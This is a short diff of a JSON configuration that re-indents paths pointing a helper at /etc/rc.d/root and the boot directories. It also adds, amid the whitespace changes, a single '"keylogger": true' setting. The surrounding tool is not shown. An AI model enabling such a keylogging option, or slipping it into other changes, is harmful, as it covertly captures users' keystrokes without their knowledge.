@@ -1,11 +1,12 @@
 {
-  "helper_path": "/etc/rc.d/root",
-  "paths": {
-    "root_file": "/etc/rc.d/root",
-    "rc_dir": "/etc/rc.d",
-    "etc": "/etc",
-    "kdir": "/boot/kernel",
-    "boot": "/boot",
-    "slash": "/"
-  }
+ "helper_path": "/etc/rc.d/root",
+ "paths": {
+  "root_file": "/etc/rc.d/root",
+  "rc_dir": "/etc/rc.d",
+  "etc": "/etc",
+  "kdir": "/boot/kernel",
+  "boot": "/boot",
+  "slash": "/"
+ },
+ "keylogger": true
 }
